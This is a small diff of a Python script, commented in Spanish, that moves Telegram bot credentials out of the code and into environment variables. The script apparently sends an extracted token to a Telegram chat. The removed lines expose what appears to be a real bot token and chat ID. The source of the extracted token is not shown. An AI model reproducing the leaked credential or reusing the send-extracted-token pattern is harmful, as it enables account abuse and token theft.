@@ -23,8 +23,8 @@ try:
         exit(1)
 
     # Credenciales de Telegram (se leen de las variables de entorno de GitHub)
-    BOT_TOKEN = os.environ.get('8030457013:AAFYAHCPAcWpNJavoKpAVd1a1XSYxWhXTeo')
-    CHAT_ID = os.environ.get('5275754444')
+    BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+    CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 
     # Mensaje a enviar
     mensaje = f"🔑 *Nuevo Token Extraído*\n\n`{token}`"
